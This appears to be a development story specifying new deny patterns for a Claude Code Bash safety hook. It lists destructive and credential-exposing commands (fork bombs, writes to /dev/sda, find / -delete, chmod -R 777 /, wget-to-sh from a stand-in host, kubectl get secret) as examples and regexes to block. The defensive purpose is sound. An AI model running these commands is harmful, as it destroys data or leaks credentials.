# Story 1.3: 危险 Bash 命令拦截增强

Status: ready-for-dev

## Story

As a **Claude Code 开发者**,
I want **block-dangerous-commands.js 新增 5 个 Bash 危险命令拦截模式（kubectl get secret、terraform output、openssl rsa -in、base64 -d 管道、docker exec 打印环境变量）及补充缺失的破坏性命令拦截（mv /、find / -delete、>/dev/sda、fork bomb 变体等）**,
So that **AI 无法通过 Bash 命令执行破坏性操作或泄露敏感凭据，实现 100% 高危命令阻止率（NFR8）**.

## Acceptance Criteria

1. **Given** Claude 尝试执行 `kubectl get secret`、`terraform output`、`openssl rsa -in`、`base64 -d` 管道或 `docker exec` 打印环境变量
   **When** block-dangerous-commands PreToolUse 钩子触发 (Bash)
   **Then** 钩子返回 deny 决策，阻止该操作
   **And** 拦截消息包含风险级别（HIGH/CRITICAL）和明确的拦截原因（如 "kubectl get secret exposes credentials"）

2. **Given** Claude 尝试执行 `> /dev/sda` 或 `> /dev/nvme0n1`（直接写入磁盘设备）
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 CRITICAL
   **And** 拦截原因指明"redirecting output to disk device"

3. **Given** Claude 尝试执行 `find / -delete`、`find /var -delete` 或 `find /etc -type f -delete`
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 CRITICAL
   **And** 拦截原因指明"find delete on root or system directory"

4. **Given** Claude 尝试执行 `mv / /tmp/` 或 `mv /some/path /dev/null`
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 CRITICAL
   **And** 拦截原因指明"moving root or critical directory"

5. **Given** Claude 尝试执行 fork bomb 变体 `:(){ :|: : };:`（不包含 `&` 的变体）
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 CRITICAL
   **And** 拦截原因指明"fork bomb variant detected"

6. **Given** Claude 尝试执行 `chmod -R 777 /` 或 `chmod 777 /etc`
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 CRITICAL
   **And** 不仅匹配 `chmod 777`，还匹配作用于根目录或系统路径的组合

7. **Given** Claude 尝试执行 `wget https://bad.example.com/script.sh | sh`（无验证脚本执行的高风险变体）
   **When** block-dangerous-commands PreToolUse 钩子触发
   **Then** 钩子返回 deny 决策，风险级别 HIGH
   **And** 与 `curl|bash` 模式统一覆盖，不遗漏 `wget|sh` 或 `curl|sudo bash` 变体

8. **Given** 新增模式总计 10 个以上（含 5 个 epics 指定 + 5 个以上缺口补充）
   **When** 测试执行
   **Then** 每个新增模式至少有 1 个正向测试（应拦截）和 1 个负向测试（不应误拦截）

9. **Given** 现有 39 个 PATTERNS 和 ALLOW_PATTERNS 不受影响
   **When** 全量测试执行
   **Then** 所有现有测试用例通过，无回归

10. **Given** Claude 尝试执行正常的 Bash 命令如 `echo "hello"`、`ls -la`、`grep "pattern" file.txt`
    **When** block-dangerous-commands PreToolUse 钩子触发
    **Then** 钩子返回 allow 决策，不误拦截

## Tasks / Subtasks

- [ ] **Task 1: 分析现有 block-dangerous-commands.js 的 PATTERNS 覆盖缺口 (AC: #1-#8)**
  - [ ] 已覆盖的 CRITICAL 模式（rm-home、rm-root、dd-disk、mkfs、fork-bomb）— 确认无需修改
  - [ ] 已覆盖的 HIGH 模式（curl-pipe-sh、chmod-777、git-*、cat-env 等）— 确认无需修改
  - [ ] 未覆盖的信息泄露模式：kubectl get secret, terraform output, openssl rsa -in, base64 -d 管道, docker exec 打印环境变量
  - [ ] 未覆盖的破坏性命令：`> /dev/sda`, `find / -delete`, `mv / /tmp/`, fork bomb 变体, `chmod -R 777 /`
  - [ ] 确认 `curl | sudo bash` 和 `wget | sh` 已被现有 pattern 10 覆盖

- [ ] **Task 2: 新增 5 个信息泄露 Bash 模式 (AC: #1)**
  - [ ] 添加 `kubectl-get-secret` 模式：`/\bkubectl\s+get\s+secret/` (HIGH)
  - [ ] 添加 `terraform-output` 模式：`/\bterraform\s+output/` (HIGH)
  - [ ] 添加 `openssl-rsa` 模式：`/\bopenssl\s+(rsa|pkey|pkcs8)\s+-in\b/` (HIGH)
  - [ ] 添加 `base64-decode-pipe` 模式：`/\bbase64\s+-d\b.*\|/` 或 `/\|.*\bbase64\s+-d\b/` (HIGH)
  - [ ] 添加 `docker-exec-env` 模式：`/\bdocker\s+exec\b.*\b(env|printenv|export)\b/` (HIGH)

- [ ] **Task 3: 新增破坏性命令补充模式 (AC: #2-#7)**
  - [ ] 添加 `redirect-disk` 模式：`/\b>[>=]?\s*\/dev\/(sd|nvme|hd|vd|xvd)/` (CRITICAL) — 匹配 `>/dev/sda`、`>>/dev/nvme0`、`1>/dev/sda` 等
  - [ ] 添加 `find-delete-root` 模式：`/\bfind\s+\/\s*-delete\b/` 及系统目录变体 (CRITICAL) — 匹配 `find / -delete`、`find /var -delete`
  - [ ] 添加 `mv-root` 模式：`/\bmv\b.+\s+\/\s+/` 或 `/\/dev\/null\b/` 的特殊规则 (CRITICAL) — 匹配 `mv / /tmp/`、`mv /etc /tmp/` 等
  - [ ] 添加 `fork-bomb-variant` 模式：`/:\(\)\s*\{.*:.*:.*:.*\};?\s*:/` (CRITICAL) — 补充不包含 `&` 的 fork bomb 变体
  - [ ] 添加 `chmod-777-root` 模式：`/\bchmod\b.*777\b.*\s+\//` (CRITICAL) — 匹配 `chmod -R 777 /`、`chmod 777 /etc`

- [ ] **Task 4: 为所有新增模式编写测试用例 (每模式 ≥2 个: 1 正例 + 1 反例, AC: #8-#10)**
  - [ ] 5 个信息泄露模式：正向测试（应拦截）+ 反向测试（不应误拦截）
  - [ ] 5 个破坏性命令补充模式：正向测试 + 反向测试
  - [ ] 确认正常的 Bash 命令（echo, ls, grep, cd 等）通过测试
  - [ ] 确认 ALLOW_PATTERNS 中的命令仍被允许（python3 --version, bun --version 等）
  - [ ] 运行全量测试：`bun test .claude/hooks/__tests__/block-dangerous-commands.test.js`

- [ ] **Task 5: 全量回归测试确认无破坏 (AC: #9)**
  - [ ] `bun test .claude/hooks/__tests__/`
  - [ ] 确认无回归，所有 423+ 测试用例通过

## Dev Notes

- **目标文件**: `.claude/hooks/block-dangerous-commands.js`
- **测试文件**: `.claude/hooks/__tests__/block-dangerous-commands.test.js`
- **现有 PATTERNS**: 39 条规则分布在 CRITICAL(9) + HIGH(13) + STRICT(17) 三个级别
- **新增量**: 10+ 条新规则（5 条信息泄露 + 5+ 条破坏性补充）

### 新增模式设计表

| #  | 模式 ID               | 级别     | 正则                                                        | 拦截原因                                          |
| -- | --------------------- | -------- | ----------------------------------------------------------- | ------------------------------------------------- |
| 1  | `kubectl-get-secret`  | HIGH     | `/\bkubectl\s+get\s+secret/`                                | kubectl get secret exposes credentials            |
| 2  | `terraform-output`    | HIGH     | `/\bterraform\s+output/`                                    | terraform output may expose secrets               |
| 3  | `openssl-rsa-decrypt` | HIGH     | `/\bopenssl\s+(rsa\|pkey\|pkcs8)\s+-in\b/`                   | openssl decrypting private key                    |
| 4  | `base64-decode-pipe`  | HIGH     | `/\bbase64\s+-[dD]\b.*\b(\||>&)/`                          | base64 decode pipeline may expose secrets         |
| 5  | `docker-exec-env`     | HIGH     | `/\bdocker\s+exec\b.*\b(env\|printenv\|export)\b/`           | docker exec printing environment variables        |
| 6  | `redirect-disk`       | CRITICAL | `/\b[>]\s*\/dev\/(sd\|nvme\|hd\|vd\|xvd)/`                 | redirecting output to disk device                 |
| 7  | `find-delete-root`    | CRITICAL | `/\bfind\s+(\/\|\/[a-z]+)\s+.*-delete\b/`                 | find delete on root or system directory           |
| 8  | `mv-root`             | CRITICAL | `/\bmv\b.+\s+\/(\s\|$)/` — 需要精确匹配,避免误报 `mv x /tmp/` | moving root or critical directory                 |
| 9  | `fork-bomb-variant`   | CRITICAL | `/:\(\)\s*\{.*:.*:.*:.*\}.*:/`                              | fork bomb variant detected                        |
| 10 | `chmod-777-root`      | CRITICAL | `/\bchmod\b.*777.*\s+\//`                                   | chmod 777 on root or system path                  |

### 现有覆盖确认（无需修改）

以下命令已在现有 PATTERNS 中完全覆盖，Story 1.3 不涉及修改：

- `rm -rf ~` / `rm -rf $HOME` — patterns 1-3 `rm-home`, `rm-home-var`, `rm-home-trailing`
- `rm -rf /` — pattern 4 `rm-root`
- `rm -rf /etc /usr /var` 等系统目录 — pattern 5 `rm-system`
- `rm ./*` — pattern 6 `rm-cwd`
- `dd if=/dev/zero of=/dev/sda` — pattern 7 `dd-disk`
- `mkfs.ext4 /dev/sda1` — pattern 8 `mkfs`
- `:(){ :|:& };:`（含 & 的 fork bomb）— pattern 9 `fork-bomb`
- `curl ... | bash` / `wget | sh` / `curl ... | sudo bash` — pattern 10 `curl-pipe-sh`
- `chmod 777 file` — pattern 14 `chmod-777`
- `git push --force main` — patterns 11, 21, 22
- pip/npm/npx 等工具限制 — patterns 23-31
- Hook 绕过防护 — patterns 32-34

### 关键正则设计注意事项

- **精确匹配**：`mv-root` 模式需要特别小心，避免误拦截合法命令如 `mv file /tmp/` 或 `mv /usr/local/bin/app /usr/local/bin/app.bak`
- **避免重叠**：`chmod-777-root` 应与现有 `chmod-777` 模式互补而非重叠；建议 `chmod-777-root` 为 CRITICAL，现有 `chmod-777` 保持 HIGH
- **`redirect-disk`**：应匹配 `>/dev/sda`、`1>/dev/sda`、`>>/dev/sda` 等变体，但不误匹配 `cat /dev/sda`（cat 读取操作已在现有 dd-disk 中处理）
- **`base64-decode-pipe`**：匹配管道前的 base64 解码或管道后的 base64 解码，确认 `echo "xxx" | base64 -d` 和 `base64 -d <<< "xxx"` 两种变体

### 测试策略

- 每个新增模式 ≥1 个正向测试 + ≥1 个反向测试（NFR10 零漏报）
- 新建测试用 describe 块：`describe('Story 1.3 patterns')`
- 正向测试：验证 `checkCommand(cmd).blocked === true` 和 `.pattern.id` 匹配预期
- 反向测试：验证 `checkCommand(cmd).blocked === false`
- 验证安全级别过滤正确（SAFETY_LEVEL = 'strict' 时所有规则生效）
- 验证 ALLOW_PATTERNS 不受影响
- 全量回归测试确认无破坏

### 文件组织

- 所有新增模式追加到 `block-dangerous-commands.js` 的 PATTERNS 数组中
- 不创建新文件，不改变现有函数签名
- 测试追加到 `__tests__/block-dangerous-commands.test.js` 中

### References

- [Source: epics.md#L307-L323] Story 1.3 定义（5 个 Bash 危险命令拦截模式）
- [Source: prd.md#FR1-FR3] 危险命令防护功能需求
- [Source: prd.md#NFR8] 100% 阻止危险命令模式（fork bomb、rm -rf、dd 等）
- [Source: prd.md#NFR10] 关键安全模式零漏报（可能有误报，但绝不遗漏）
- [Source: prd.md#P0-1] protect-secrets 增强 — 5 Bash 拦截
- [Source: prd.md#L100-L103] 新增 5 个 Bash 拦截模式（kubectl get secret、terraform output、openssl rsa -in、base64 -d 管道、docker exec 打印环境变量）
- [Source: architecture.md#5] protect-secrets 模式库组织 — DANGEROUS_BASH
- [Source: architecture.md#6] 测试扩展策略（≥3 用例/类别）
- [Source: block-dangerous-commands.js#L20-L248] 现有 39 条 PATTERNS 实现

## Dev Agent Record

<!-- Dev agent 完成实现后填写以下部分 -->

### Agent Model Used

TBD

### File List

- `.claude/hooks/block-dangerous-commands.js` (修改 — 新增 10+ Bash 拦截模式)
- `.claude/hooks/__tests__/block-dangerous-commands.test.js` (修改 — 新增测试用例)

## Completion Notes

TBD